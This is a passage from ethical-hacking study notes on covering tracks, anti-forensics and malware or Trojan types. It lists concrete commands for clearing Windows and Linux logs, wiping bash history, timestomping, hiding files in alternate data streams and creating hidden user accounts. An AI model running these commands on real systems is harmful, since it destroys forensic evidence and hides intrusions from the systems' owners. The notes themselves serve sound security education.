				- Display list of event logs: wevtutil el
				- Clear the event logs: wevtutil cl <log_name>
			- Manually Clearing Event Logs:
				- Windows:
					- Navigate to Start -> Control Panel -> System and Security -> Windows Tools -> double-click Event Viewer
					- Delete the all the log entries logged while compromising the system
				- Linux:
					- Navigate to the /var/log directory on the Linux system
					- Open the plaintext file containing log messages with text editor /var/log/<filename.log>
					- Delete all the log entries logged while compromising the system
		- Manipulating Logs:
			- An attacker alters logs to prevent detection and avoid legal consequences.
		- Covering Tracks on the Network:
			- An attacker employs techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and manipulation of TCP parameters to hide their activities on the network.
			- Using Reverse HTTP Shells:
				- The attacker installs a reverse HTTP shell on the victim’s machine, designed to request commands from an external controller operating the reverse HTTP shell. In this setup, the victim acts as a web client executing HTTP GET requests, while the attacker functions as a web server, responding to these requests. This type of traffic is often perceived as normal by an organization’s network perimeter security controls, such as DMZs, firewalls, and similar systems.
			- Using Reverse ICMP Tunnels:
				- The attacker employs an ICMP tunneling technique, using ICMP echo and ICMP reply packets to carry TCP payloads, enabling stealthy access to or control of a system. The victim's system is manipulated to encapsulate the TCP payload within an ICMP echo packet, which is then sent to the proxy server. Many organizations have security mechanisms that focus on inspecting incoming ICMP packets but neglect outgoing ICMP packets, allowing attackers to bypass firewalls with relative ease.
			- Using DNS Tunneling:
				- Attackers can leverage DNS tunneling to embed malicious content or data from other programs within DNS queries and responses. This technique establishes a covert channel to communicate with remote servers and applications. Through this back channel, attackers can exfiltrate stolen, confidential, or sensitive information from the targeted server.
			- Using TCP Parameters:
				- Attackers can exploit TCP parameters to distribute payloads and establish covert channels.
				- The TCP fields where data can be concealed include:
					- IP Identification Field : This method involves transferring a payload bit by bit over an established session between two systems. In this approach, one character is encapsulated within each packet.
					- TCP Acknowledgment Number : This method is more complex as it involves the use of a bounce server. The bounce server receives packets from the victim and forwards them to the attacker. In this approach, one hidden character is relayed by the bounce server per packet.
					- TCP Initial Sequence Number : This method does not require an established connection between the two systems. In this approach, one hidden character is encapsulated within each SYN request and reset packet.
		- Covering Tracks on the OS:
			- Windows:
				- NTFS includes a feature called Alternate Data Streams (ADS), which can be exploited by attackers to hide malicious files within legitimate files.
				- Hide file using NTFS:
					- Open the Command Prompt with elevated privileges.
					- Run command: type C:\SecretFile.txt > C:\LegitFile.txt:SecretFile.txt
					- In this case, the "SecretFile.txt" is hidden within "LegitFile.txt" on the C: drive.
					- View the hidden file by hidden file's name: more < C:\LegitFile.txt:SecretFile.txt
				- Modifying Date and Time (changing the access time of specific files):
					- timestomp file_name.doc -z “<Date> <time>”
					- powershell -Command (Get-Item $File_name).LastWriteTime = $(Get-Date).AddHours(-10)
					- Change access time: touch -a -d '<date> <time>' $File_name
					- Change date and time of last modification: touch -m -d '<date> <time>' $File_name
			- UNIX/LINUX:
				- In UNIX, files can be hidden by simply appending a dot (.) at the beginning of the file name.
				- Covering BASH Shell Tracks:
					- BASH is an sh-compatible shell that stores command history in a file located at ~/.bash_history
					- Disabling history: export HISTSIZE=0
					- Clear stored history: history –c
					- Clear history of current shell: history -w
					- Clear user's complete history: cat /dev/null > ~/.bash_history && history -c && exit
					- Shred history file (making its content unreadable): shred ~/.bash_history
					- Shred history file and clear evidence of command: shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit
		- Deleting Files:
			- Delete Files using Cipher.exe:
				- Cipher.exe is an in-built Windows command-line tool that can be used to securely delete data by overwriting it, making it difficult to recover in the future.
				- To overwrite deleted files in specific folder: cipher /w:<drive_letter>:\<folder_name>
				- To overwrite all the deleted files in drive: cipher /w:<drive_letter>
		- Disabling Windows Functionality:
			- An attacker disables Windows features, such as last access timestamps, hibernation, virtual memory, and system restore points, to cover their tracks.
			- Disable the Last Access Timestamp:
				- The last access timestamp of a file records the date and time when the file was last opened for reading or writing. Each time a user accesses the file, the timestamp is updated.
				- Fsutil is a Windows utility used to configure NTFS volume behavior parameters, such as DisableLastAccess, which controls the enabling or disabling of the last access timestamp.
				- Disable last access updates: fsutil behavior set disablelastaccess 1
				- Enable last access updates: fsutil behavior set disablelastaccess 0
			- Disable Windows Hibernation:
				- The hibernation file (Hiberfil.sys) is a hidden system file located in the root directory of the drive where the operating system is installed. This file stores the contents of the system's RAM on the hard disk when the user selects to hibernate the system.
				- Windows hibernation can be disabled using either the Registry Editor or the powercfg command.
				- Disable Windows hibernation through the Registry Editor:
					- Open the Registry Editor and navigate to the path: Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power
					- In the right pane, double-click on HibernateEnabledDefault; the Edit DWORD (32-bit) Value dialog box will appear.
					- In the Value data field, enter 0 to disable hibernation.
					- Click OK to apply the changes.
				- Disable Windows hibernation using powercfg:
					- Launch the Command Prompt with administrator privileges.
					- Disable hibernation: powercfg.exe /hibernate off
			- Disable Windows Virtual Memory (Paging File)
				- Virtual memory, also called the paging file, is a special file in Windows used as compensation when physical memory (RAM) falls short of available space. For example, if an attacker has an encrypted file and wants to read it, it must first be decrypted. The decrypted data may remain in the paging file even after the attacker logs out of the system.
				- Disable paging:
					- Open the Control Panel and navigate to: System and Security -> System -> Advanced system settings
					- A System Properties dialog box will appear. In the Advanced tab, click Settings under the Performance section.
					- The Performance Options dialog box will appear. Go to the Advanced tab and click Change under the Virtual Memory section.
					- In the Virtual Memory dialog box, uncheck Automatically manage paging file size for all drives.
					- Select the drive where paging should be disabled, then check the option No paging file and click Set.
					- In the System Properties window, click Yes.
					- Finally, click OK to apply the changes.
			- Disable System Restore Points:
				- System restore points contain information about hidden data and previously deleted files, which poses a risk for attackers, as deleted files can be recovered from earlier restore points.
				- Disable system restore points:
					- Open the Control Panel and navigate to: System and Security -> System -> System Protection
					- A System Properties dialog box will appear. In the System Protection tab, select the drive and click Configure
					- Under the Restore Settings section, select the Disable system protection option and click the Delete button.
					- The System Protection wizard will appear; click Continue to delete all restore points on the drive.
					- Click OK to apply the changes.
					- Repeat the above steps for all disk partitions.
			- Disable Windows Thumbnail Cache:
				- Thumbs.db is a Windows file that stores thumbnails of document types such as PPTX and DOCX, as well as graphic files like GIF, JPEG, PNG, and TIFF. This thumbnail file contains information about files that were previously deleted or accessed on the system.
				- For example, if an attacker used an image file to hide a malicious file and later deleted it, a thumbnail of this image would be stored inside the thumbs.db file, revealing that the deleted file was previously used on the system.
				- Disable the thumbnail cache:
					- Press the Windows + R keys to open the Run dialog box.
					- Type gpedit.msc and press Enter or click OK.
					- The Local Group Policy Editor window will appear. Navigate to: User Configuration -> Administrative Templates -> Windows Components -> File Explorer
					- Double-click on the "Turn off the caching of thumbnails in hidden thumbs.db files" setting in the right pane.
					- Select Enabled to turn off the thumbnail cache.
					- Click OK to apply the changes.
			- Disable Windows Prefetch Feature:
				- Prefetch is a Windows feature that stores data about applications typically used by system users. This stored data helps enhance system performance by reducing the time required to load or start applications.
				- For example, if an attacker installs and then uninstalls a malicious application, a record of that application may still be stored in the Prefetch file. These Prefetch files can be useful for security personnel in recovering information about deleted applications during the investigation of a security incident.
				- Disable the Prefetch feature:
					- Press the Windows + R keys to open the Run dialog box.
					- Type services.msc and press Enter or click OK.
					- Search for the SysMain (Superfetch) service, then double-click it to open the SysMain Properties (Local Computer) window.
					- In the Startup type drop-down menu, select Disabled.
					- Click OK to apply the changes.
			- Clear Online Tracks from Privacy Settings (Windows 11):
				- Right-click on the Start button, select Settings, and navigate to Personalization.
				- In the Personalization section, click on Start in the left pane.
				- Turn off both "Show most used apps" and "Show recently opened items in Start, Jump Lists, and File Explorer."
			- Clear Online Tracks From the Registry (Windows 11):
				- Open the Registry Editor by pressing Win + R, typing regedit, and pressing Enter.
				- Navigate to: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
				- Locate and remove the key for "RecentDocs".
				- Delete all values except for "(Default)".
		- Delete Windows History:
			- Deleting Windows Activity History:
				- Attackers can cover their tracks by deleting the Windows Activity history after unauthorized system use, thereby removing evidence of their activities. Since the Windows Activity history records user activities, including file access, application usage, and browsing history, erasing this data can help conceal their presence and actions on the compromised system.
				- Delete Windows Activity History:
					- Open the Settings by clicking the Start button or by pressing the Win + I keys together.
					- In the Settings window, click on Privacy & security in the left pane, then click on the Activity history section in the right pane.
					- Click the Clear button under the Clear activity history section.
					- Click OK on the pop-up to confirm clearing the activity history.
					- Once the process is complete, a checkmark will appear next to the Clear button, indicating the action was successful.
		- Deleting Incognito History:
			- Attackers use incognito mode to prevent the browser from storing browsing history, cookies, and other site data locally on the device. Incognito mode helps attackers conceal their online activities from others who may have access to the device.
			- Deleting Incognito History in Windows:
				- Open the Start menu, search for Command Prompt, and select Run as administrator.
				- Display the list of recently visited domains, including those accessed in incognito mode: ipconfig /displaydns
				- Clear all DNS cache entries and remove traces of recent browsing history: ipconfig /flushdns
			- Deleting Incognito History in macOS:
				- Open the Applications folder, select Utilities, and run Terminal.
				- Delete the incognito browsing history: sudo killall -INFO mDNSResponder
		- Hiding Artifacts:
			- Attackers often attempt to conceal artifacts related to their malicious activities in order to bypass security controls. Every operating system hides artifacts, such as internal task execution data and critical system files. Attackers take advantage of this feature to hide their own artifacts - such as directories, user accounts, files, folders, or other system-related elements - within existing system artifacts to evade detection.
			- Hiding Artifacts in Windows:
				- Hiding Files and Folders: attrib +h +s +r <FolderName>
				- Hiding Users:
					- Create hidden user account: net user <UserName> /add
					- Activate the account for exploitation: net user <UserName> /active:yes
					- Hide the account when it is not required: net user <UserName> /active:no
				- Hiding User Accounts:
					- Open Registry Editor and navigate to following location: HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon
					- Right-click on Winlogon, hover over New, and select Key.
					- Rename the newly created key to <Account1>. Next, right-click on <Account1>, hover over New, and select Key, then rename it to <Account2>.
					- Right-click on <Account2>, hover over New, and select DWORD (32-bit) Value.
					- Rename the new DWORD value to <UserName>, where <UserName> is the name of the user account to hide.
			- Hiding Artifacts in Linux:
				- Hiding Files and Folders:
					- In Linux, files or folders can be hidden by prefixing the file name with a dot (.)
			- Hiding Artifacts in macOS:
				- Hiding Files and Folder:
					- Hide files: defaults write com.apple.finder AppleShowAllFiles FALSE killall Finder
					- Hide specified file (Add space at the end): chflags hidden <filename>
		- Clear Online Tracks:
			- Attackers can erase online traces stored on the target computer, including web history, logs, cookies, cache, download records, and timestamps of visited sites. This prevents victims from detecting the online activities conducted by the attackers.
			- Ways to Clear:
				- Use private browsing
				- Delete history in the address field
				- Disable stored history
				- Delete private data
				- Clear cookies on exit
				- Clear cache on exit
				- Delete downloads
				- Disable password manager
				- Clear data in the password manager
				- Delete saved sessions
				- Delete user JavaScript
				- Set up multiple users
				- Remove Most Recently Used (MRU)
				- Clear toolbar data from browsers
				- Turn off AutoComplete
	- Anti-forensics for Covering Tracks:
		- Anti-forensics is a set of techniques used by attackers or perpetrators to conceal their malicious activities. By employing anti-forensics methods, attackers erase, alter, or conceal various actions taken to compromise a target system or network.
		- Anti-forensics Techniques:
			- Data/File Deletion : When a file is deleted from the hard drive, the operating system removes the pointer to the file. In the case of the Windows operating system, deleted data remains in the Recycle Bin if attackers use the normal delete operation, rather than the Shift+Delete operation. To prevent the recovery of such deleted files, attackers may hide or delete the metadata associated with the files in the Recycle Bin.
			- Password Protection : Attackers use password protection techniques to conceal malicious activities, prevent the reverse engineering of applications, prevent information extraction from network devices, and prevent access to critical files and folders on the system or hard disk.
			- Steganography : Attackers use steganography to hide information when encryption is unfeasible. Attackers can embed information such as the source code for a hacking tool, a list of compromised servers, plans for future attacks, and communication or coordination channels as part of a steganographic attempt.
			- Data Hiding in File System Structures : Data hiding is an anti-forensic technique employed by attackers to render data inaccessible. $BadClus is a sparse file that allows attackers to hide unlimited data, as they can allocate additional clusters to $BadClus to conceal more data. Some hard disks have Host-Protected Areas (HPAs), where developers can store data they want to protect (and hide) from normal use. An attacker with malicious intent can exploit these areas to hide illicit data. In addition to these techniques, attackers use DPAs (Data Partition Areas) and slack spaces to hide data that are not visible to either the BIOS or the operating system, requiring special tools to detect and view.
			- Minimizing Footprint : Attackers often leave minimal or no footprints after executing an attack. The goal is to carry out the attack without raising alarms and then eliminate all traces of their actions. To minimize footprints, attackers utilize various resources, such as stolen identities, virtual machines, cloud infrastructure, untraceable cryptocurrencies, and running operating systems from Live USBs or External HDD.
			- Trail Obfuscation : The purpose of trail obfuscation is to delete evidence and conceal the traces of malicious activities to evade detection by defensive systems. Attackers perform trail obfuscation through log tampering, generating false email headers, modifying timestamps, and altering various file headers. Tools such as Timestomp and Transmogrify are used by attackers to modify, edit, and delete date and time metadata on files, making it difficult for security professionals to trace the attacker’s origin.
				- Trail obfuscation using other tools and techniques:
					- Log cleaners
					- Zombie accounts
					- Spoofing
					- Trojan commands
					- Misinformation
			- Artifact Wiping : Artifact wiping refers to the process of permanently deleting or destroying evidence data using file-wiping and disk-cleaning utilities, disk degaussing/destruction, and disk formatting techniques. The primary purpose of artifact wiping is to eliminate traces of unauthorized activities on a computer system or storage device, making it difficult for security professionals to accurately reconstruct events and identify the culprit.
				- Attackers use various tools for artifact wiping:
					- BCWipe
					- Total WipeOut
					- DriveScrubber
					- Disk Wipe
					- KillDisk
					- R-Wipe & Clean
					- BitRaser File Eraser
					- Blancco File Eraser
			- Overwriting Data/Metadata : Data overwriting is one of the most common and widely used anti-forensic techniques employed by attackers. In this technique, attackers overwrite all addressable locations on digital storage media with random characters. They may also use standard data-wiping tools and techniques, such as simple deletion, data shredding, and data wiping, which perform multiple overwrites on the media to cover their tracks. As a result, it becomes difficult for security professionals and defensive systems to retrieve traces of the attack from the digital media.
			- Program Packers : Attackers use program packers to hide their data by compressing files with various cryptographic algorithms. This technique allows attackers to conceal evidence files in containers, making them difficult to detect. Password-protected program packers can present a challenge for security professionals, as they must first decrypt the password to unpack the file. These packers also help attackers conceal tools used in the attack, making it harder to trace them through reverse engineering attempts.
				- Attackers use various packers:
					- UPX
					- PECompact
					- BurnEye
					- Exe Stealth Packer
					- Smart Packer Pro
			- Access Anonymization : Access anonymization refers to techniques used by attackers to hide their digital footprints by anonymizing their access to systems, networks, or data. This process aims to make it more difficult for security professionals to trace malicious activities back to specific individuals or entities. Attackers use tools such as proxy servers, anonymization services, Tor networks, traffic padding, and anonymous communication channels for access anonymization.
	- Track-Covering Tools: Track-covering tools help attackers clean up all traces of computer and internet activities on the target system. These tools free cache space, delete cookies, clear internet history and shared temporary files, erase logs, and discard junk files.
		- CCleaner : CCleaner is a system optimization, privacy, and cleaning tool. It removes traces of temporary files, unused files, log files, registry entries, memory dumps, and online activities such as internet history.
		- DBAN : Delete information stored on hard disk drives (HDDs, not SSDs) and remove viruses and spyware from Microsoft Windows installations.
		- Privacy Eraser Free : A single, all-encompassing privacy suite that cleans up internet browsing history, cookies, saved passwords, recent documents, clipboard data, Windows run history, etc.
		- Wipe : Efficiently managing storage space by removing temporary files, caches, cookies, and browsing history. Additionally, eliminating unnecessary data minimizes the risk of unauthorized access, ensuring online activities remain confidential and protected from potential threats (privacyroot.com)
		- BleachBit : BleachBit is an open-source tool designed for Linux and Windows systems. It frees cache, deletes cookies, clears internet history, shreds temporary files, deletes logs, and discards junk. It wipes clean traces from thousands of applications, including Firefox, Adobe Flash, Google Chrome, Opera, and more. Beyond simply deleting files, BleachBit includes advanced features such as shredding files to prevent recovery, wiping free disk space to hide traces of files deleted by other applications, and vacuuming Firefox to improve its performance.
		- east-tec Eraser : east-tec Eraser is a privacy protection software that erases all files that store evidence of computer and internet activities. It helps keep PC clean by deleting large amounts of unnecessary data stored on computer, with or without approval.


--------------------------------------------------

# Malware Threats

- Malware
	- Malware is malicious software designed to damage or disable computer systems, giving the malware creator limited or full control over the system for malicious activities such as theft or fraud. It may delete files, slow down computers, steal personal information, send spam, or commit fraud.
	- Techniques for Distributing Malware on the Web (Security Threat Report - www.sophos.com):
		- Black Hat Search Engine Optimization (SEO) : Black hat SEO (also referred to as unethical SEO) uses aggressive SEO tactics, such as keyword stuffing, inserting doorway pages, page swapping, and adding unrelated keywords, to get higher search engine rankings for malware pages.
		- Social Engineered Click-jacking : Attackers inject malware into websites that appear legitimate to trick users into clicking them. When clicked, the malware embedded in the link executes without the user's knowledge or consent.
		- Spear-phishing Sites : This technique is used to mimic legitimate institutions, such as banks, to steal passwords, credit card and bank account information, and other sensitive data.
		- Malvertising : This technique involves embedding malware-laden advertisements in legitimate online advertising channels to spread malware to the systems of unsuspecting users.
		- Compromised Legitimate Websites : Often, attackers use compromised websites to infect systems with malware. When an unsuspecting user visits the compromised website, they unknowingly install the malware on their system, after which the malware performs malicious activities.
		- Drive-by Downloads : This refers to the unintentional downloading of software via the Internet. In this case, an attacker exploits flaws in browser software to install malware simply by visiting a website.
		- Spam Emails : The attacker attaches a malicious file to an email attachment or embeds the malware in the email body and sends the email to multiple target addresses. The victim is tricked into clicking the attachment, thus executing the malware and compromising their machine.
		- Rich Text Format (RTF) Injection : RTF injection involves exploiting features of Microsoft Office, such as RTF template files stored locally or on a remote machine. RTF templates are used to specify the document format. Attackers inject malicious macros into RTF files and host them on their servers. When a user opens the document, the malicious template is automatically retrieved from the remote server, evading security systems.
	- Components of Malware Malware:
		- Crypter : It is a software program designed to conceal the existence of malware. Attackers use this software to evade antivirus detection and protect the malware from reverse engineering or analysis, making it difficult for security mechanisms to detect.
		- Downloader : It is a type of Trojan that downloads other malware or malicious code and files from the Internet. Usually, attackers install a downloader when they first gain access to a system.
		- Dropper : It is a covert carrier of malware. Attackers embed malicious malware files inside droppers, which can perform the installation task covertly. Attackers must first install the malware program or code on the system to execute the dropper. The dropper can transport malware and execute it on a target system without being detected by antivirus scanners.
		- Exploit : It is the part of the malware that contains code or a sequence of commands that can take advantage of a bug or vulnerability to breach the system’s security. Based on the type of vulnerabilities exploited, exploits are categorized into local exploits and remote exploits.
		- Injector : This program injects exploits or malicious code from the malware into other vulnerable running processes and alters the execution method to hide or prevent its removal.
		- Obfuscator: It is a program that conceals the malicious code of malware using various techniques, making it difficult for security mechanisms to detect or remove it.
		- Packer: This software compresses the malware file, converting the code and data into an unreadable format. It uses compression techniques to pack the malware.
		- Payload : It is the part of the malware that performs the desired activity when activated. It may be used to delete or modify files, degrade system performance, open ports, change settings, etc., in order to compromise system security.
		- Malicious Code : This is a piece of code that defines the basic functionality of the malware and contains commands that lead to security breaches.
	- Potentially Unwanted Applications (PUAs):
		- Potentially unwanted applications or programs (PUAs or PUPs), also known as grayware or junkware, are potentially harmful applications that may pose significant risks to the security and privacy of data stored on the system where they are installed.
		- Types of PUAs:
			- Adware : These PUAs display unsolicited advertisements offering free sales, issue bogus reminders about outdated software or OS, and show pop-ups for online services while browsing websites. They may disrupt normal activities and lure victims into clicking on malicious URLs.
			- Torrent : When using torrent applications to download large files, the user may be compelled to download unwanted programs that have peer-to-peer file sharing features.
			- Marketing : Marketing PUAs track users' online activities and transmit browser details along with information about personal interests to third-party app owners. These applications then use this data to market products and resources tailored to users’ preferences.
			- Cryptomining : Cryptomining PUAs exploit victims' system resources and may access financial data to perform digital cryptocurrency mining, such as generating bitcoins.
			- Dialers : Dialers, or spyware dialers, are programs that automatically install and configure themselves on a system to make calls to a set of contacts at various locations without the user's consent. These dialers can result in massive telephone bills and are often difficult to detect and remove.
- Advanced Persistent Threats
	- Advanced Persistent Threats (APTs) are a type of network attack in which an attacker gains unauthorized access to a target network and remains undetected for an extended period. The primary objective of APTs is to steal sensitive information rather than to sabotage the organization or its network.
- Trojan
	- A Trojan is a program that conceals malicious or harmful code within an apparently harmless program or data, which can later gain control of the system and cause damage. Trojans are activated when a user performs certain predefined actions.
	- Trojans operate with the same level of privileges as the victim. For instance, if a victim has the privileges to delete files, transmit information, modify existing files, or install programs (including those that provide unauthorized network access or execute privilege escalation attacks), the Trojan, once it infects the system, inherits these privileges. Additionally, it may attempt to exploit vulnerabilities to gain even higher levels of access than the user running it.
	- Trojans Are Used For:
		- Steal sensitive information such as account data, including login credentials, email addresses, and passwords.
		- Record screenshots, audio, and video from the victim's PC.
		- Disable firewalls and antivirus software.
		- Create backdoors to gain remote access.
		- Exploit the victim's PC as a proxy server for relaying attacks.
		- Use the victim's PC as part of a botnet to carry out DDoS (Distributed Denial of Service) attacks.
		- Generate fake traffic to execute DoS (Denial of Service) attacks.
		- Use the victim's PC for spamming and sending bulk email messages.
		- Delete or replace critical operating system files.
		- Encrypt the victim's machine, rendering it inaccessible to the victim, and prevent access to its contents.
	- Common Ports Used by Trojans:
		- Ports serve as entry and exit points for data traffic. There are two types of ports: hardware ports and software ports. In an operating system, ports are software-based and typically function as entry and exit points for application traffic.
	- Types of Trojans:
		- Remote Access Trojans:
			- Remote Access Trojans (RATs) provide attackers with full control over the victim's system, allowing them to remotely access files, private conversations, accounting data, and more. The RAT functions as a server and listens on a port that is typically not meant to be accessible to internet attackers.
			- Remcos RAT : Remcos RAT (Remote Control and Monitoring System) is a powerful remote access trojan (RAT) designed to provide attackers with full control over an infected system. It is typically used for cyber espionage, theft of sensitive data, or other malicious activities. Key features of Remcos RAT include remote control, keylogging, screen capture, audio and video recording, file management, persistence, password stealing, data exfiltration, proxies and VPNs, and encryption.
			- Additional RATs: Parallax RAT, AsyncRAT, Xeno RAT, Kedi RAT, AhMyth, MagicRAT, NetSupport RAT, StrRAT and Ratty, MINEBRIDGE
		- Backdoor Trojans:
			- A backdoor is a program that allows unauthorized access to a system by bypassing standard authentication mechanisms or conventional security measures, such as IDS and firewalls, without detection. Backdoors are used by attackers for uninterrupted access to the target machine. In these types of breaches, hackers exploit backdoor programs to gain access to the victim's computer or network.
			- TinyTurla-NG (TTNG) : TinyTurla-NG (TTNG) is a backdoor Trojan operated by the Turla APT group, a Russian cyber-espionage threat actor. This backdoor Trojan enables attackers to gain remote access and control over infected systems, facilitating the exfiltration of sensitive data, execution of commands, and the conduct of various malicious activities. Attackers use compromised WordPress-based websites as command-and-control (C2) endpoints for the TTNG backdoor.
			- Additional Backdoor Trojans: SmokeLoader, BazarLoader, Kovter, POWERSTATS v3, RogueRobin, ServHelper, SpeakUp linux backdoor, Winnti backdoor, Daxin, SysJoker, PortDoor, GoldenSpy
		- Botnet Trojans:
			- Attackers, also known as "bot herders," use botnet Trojans to infect a large number of computers across a wide geographical area, creating a network of bots (or a "bot herd") that can be controlled via a command-and-control (C&C) center.
			- RDDoS : RDDoS is a botnet Trojan capable of executing commands and carrying out DDoS attacks on target systems. It leverages online parameters that enable attackers to differentiate between types of infected devices. Additionally, it can distinguish between sandboxes and real devices based on the operating parameters embedded in the online packages.
			- Additional Botnet Trojans: Horabot, hailBot, kiraiBot, catDDoS, ZeroBot, XorDdos, Nexus Android botnet, Satori, Torii botnet, Qakbot, Hide n Seek, Ramnit, Panda, BetaBot
		- Rootkit Trojans:
			- A "rootkit" combines "root" (administrator access) and "kit" (tools for gaining access). It is a powerful backdoor that targets the root or OS, providing attackers full control. Unlike typical backdoors, rootkits are hard to detect, as they do not appear in services, task lists, or registries.
			- Reptile Rootkit : Reptile is a kernel module rootkit primarily designed to target Linux-based systems. It offers advanced features, including a reverse shell and the ability to conceal its presence. Attackers can use the reverse shell to gain control of the target system.
			- Additional Rootkit Trojans: CEIDPageLock, Wingbird, GrayFish, Finfisher, ZeroAccess, Whistler, Fire Chili rootkit, Purple Fox Rootkit, Dubbed Demodex Rootkit, MoonBounce, Moriya, iLOBleed
		- E-Banking Trojans:
			- E-banking Trojans are a major threat to online banking. They intercept the victim's account information before it is encrypted and sent to the attacker's command-and-control center. Banking Trojans steal users' information through methods such as keylogging, form data capture, inserting fraudulent form fields, screen captures, video recording, mimicking financial websites, redirecting to banking sites, and man-in-the-middle attacks.
			- CHAVECLOAK : CHAVECLOAK is a banking Trojan that uses advanced techniques to exfiltrate financial data from targeted users. The attack begins with the download of a malicious ZIP file disguised as a PDF, which then employs methods like DLL side-loading to execute the malware.
			- Additional E-Banking Trojans: Grandoreiro, Ursnif (Gozi), Nexus, DanaBot, QakBot (Qbot), Ramnit, IcedID, Emotet
		- Point-of-Sale Trojans:
			- As the name suggests, point-of-sale (POS) Trojans are financial malware that target POS and payment devices like credit/debit card readers. Attackers use POS Trojans to compromise these devices and steal sensitive information, such as credit card numbers, cardholder names, and CVV codes.
			- Prilex POS : Prilex is a Brazilian threat actor group that primarily targets POS terminals to steal sensitive information. The attackers often pose as POS technicians, tricking targets into installing malicious software disguised as a required update. They may either visit stores in person as technical specialists or request remote access by having vendors install remote desktop apps like AnyDesk.
			- Additional POS Trojans: LockPOS, BlackPOS, FastPOS, PunkeyPOS, CenterPOS, MalumPOS
		- Defacement:
			- Defacement Trojans, once spread through a system, can destroy or alter database content. They are particularly dangerous when targeting websites, as they modify the underlying HTML, altering the site's content.
			- Restorator : Restorator is a utility for editing Windows resources in applications and components (e.g., .exe, .dll, .res, .rc, and .dcr files). It enables users to modify, add, or remove resources like text, images, icons, sounds, videos, versions, dialogs, and menus in most programs. This tool is useful for translation, localization, customization, design enhancement, and development.
		- Service Protocol Trojans:
			- Service Protocol Trojans exploit vulnerable service protocols like VNC, HTTP/HTTPS, and ICMP to attack the victim’s machine.
			- VNC Trojans : A VNC Trojan starts a VNC server daemon on the victim's system, allowing the attacker to connect via any VNC viewer. Since VNC is a legitimate utility, this Trojan is difficult for antivirus software to detect. Well-known financial malware like Vultur, Dridex, and Gozi use a hidden virtual network computing (HVNC) module, enabling attackers to gain user-level access to an infected PC.
			- HTTP/HTTPS Trojans : HTTP/HTTPS Trojans bypass firewalls by working in reverse, unlike a standard HTTP tunnel. They use web-based interfaces and port 80. The Trojan executes on the internal host, spawning a child program at a scheduled time. Since the child program appears as a legitimate user to the firewall, it is granted internet access. However, it then runs a local shell, connects to the attacker’s web server via a seemingly legitimate HTTP request, and sends a ready signal.
			- SHTTPD : SHTTPD is a lightweight HTTP server that can be embedded into any program. It can be wrapped in a legitimate program (e.g., chess.exe), and when executed, it turns the computer into an invisible web server.
			- HTTP RAT : HTTP RAT uses web interfaces and port 80 to gain access, functioning like an HTTP tunnel but in reverse. These Trojans are particularly dangerous as they can operate virtually anywhere with internet access.
			- ICMP Trojans : The Internet Control Message Protocol (ICMP) is an essential part of IP, required for all IP modules. It is a connectionless protocol that sends error messages to unicast addresses and encapsulates packets within IP datagrams.
		- Mobile Trojans:
			- Mobile Trojans are malicious apps that target mobile phones. The attacker tricks the victim into installing the app, which then performs various attacks, including stealing banking and social networking credentials, encrypting data, and locking the device.
			- Chameleon : Chameleon is a banking Trojan targeting Android devices, distributed through various methods, primarily phishing pages. It adapts to multiple commands, including verifying app package names, and mainly targets mobile banking apps. By using the proxy feature, it can manipulate the device as the victim, enabling attackers to carry out device takeover (DTO) and account takeover (ATO) attacks through Accessibility Service privileges.
			- Additional Mobile Trojans: Vultur, PixPirate, GoldPickaxe, GoldDigger, SpyNote, Anatsa, Xenomorph
		- IoT Trojans:
			- The Internet of Things (IoT) refers to the interconnection of physical devices, buildings, and other items embedded with electronics. IoT Trojans are malicious programs that target IoT networks, using a botnet to attack other machines outside the network.
			- OpenSSH Trojan : Microsoft researchers have uncovered a sophisticated cyberattack targeting Linux-based systems and IoT devices exposed to the internet. The attackers exploited a modified version of OpenSSH to gain control and install cryptomining malware. A backdoor was deployed to run malicious tools, including rootkits and an IRC bot, hijacking the compromised devices' computing resources for cryptomining.
			- Additional IoT Trojans: Ttint, XorDdos, Mozi, Silex BrickerBot, Torii botnet, Bashlite IoT Malware, Gafgy Botnet, Katana, BotenaGo, Dark Nexus
		- Security Software Disabler Trojans: 
			- Security software disabler Trojans disable security programs like firewalls and IDS by either shutting them down or killing their processes. These entry Trojans pave the way for attackers to launch subsequent attacks on the target system.
			- Security Software Disabler Trojans: Chameleon, CertLock, GhostHook
		- Destructive Trojans:
			- Destructive Trojans are designed solely to delete files on a target system. Often undetected by antivirus software, they randomly delete files, folders, registry entries, and data on local and network drives, potentially causing OS failure.
			- Destructive Trojans: SilverRAT, HermeticWiper, WhisperGate, FoxBlade
		- DDoS Attack Trojans:
			- These Trojans are designed to carry out DDoS attacks on target machines, networks, or websites. They turn the victim into a zombie, awaiting commands from a DDoS server on the internet.
			- Mirai IoT botnet Trojan : The Mirai IoT botnet Trojan remains one of the most notorious DDoS attack Trojans.
			- DDoS attack Trojans: RDDoS, Horabot, hailBot, kiraiBot, and catDDoS
		- Command Shell Trojans:
			- A command shell Trojan provides remote control of a victim's machine by installing a Trojan server that opens a port for the attacker to connect. The attacker’s machine runs the client to launch the command shell on the victim's system.
			- Command Shell Trojans: Netcat, DNS Messenger, GCat
	- Infect Systems Using Trojan:
		- Step 1: Creating Trojan:
			- Attackers can create Trojans using various Trojan horse construction kits, such as DarkHorse Trojan Virus Maker, njRAT, and Trojan Horse Construction Kit. Crafting a new Trojan packet enhances the likelihood of successfully compromising the target system, as security mechanisms may fail to detect it. These Trojans can be delivered to the victim’s machine via a dropper or downloader.
			- Trojan Horse Construction Kits: DarkHorse Trojan Virus Maker, njRAT, Trojan Horse Construction Kit, Social Engineering Toolkit (SET), THorse, Senna Spy Trojan Generator, THOSE RAT, Umbra Loader - Botnet Trojan Maker, VenomRAT
			- njRAT : njRAT is a remote access trojan (RAT) with robust data-stealing capabilities. It can log keystrokes, access a victim's camera, steal credentials stored in browsers, upload and download files, perform process and file manipulations, and view the victim's desktop. Additionally, this RAT can be used to control botnets (networks of compromised computers), enabling attackers to update, uninstall, disconnect, restart, and close the RAT, as well as rename its campaign ID.
		- Step 2: Employing a Dropper or Downloader:
